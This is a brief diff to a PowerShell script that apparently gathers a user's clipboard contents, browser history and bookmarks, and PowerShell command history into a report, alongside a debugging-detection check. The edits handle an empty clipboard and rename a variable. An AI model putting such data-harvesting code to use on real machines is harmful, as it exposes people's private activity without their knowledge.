@@ -289,6 +289,9 @@ $debugDetect = "Debugging Check : $debugD"
 
 
 $clipboard = Get-Clipboard
+if (!($clipboard)){
+    $clipboard = "No Data Found.."
+}
 # History and Bookmark Data
 $Expression = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
 $Paths = @{
@@ -489,7 +492,7 @@ $clipboard
 
 Browser History
 ---------------------------------------
-$Value
+$entry
 
 Powershell History
 ---------------------------------------
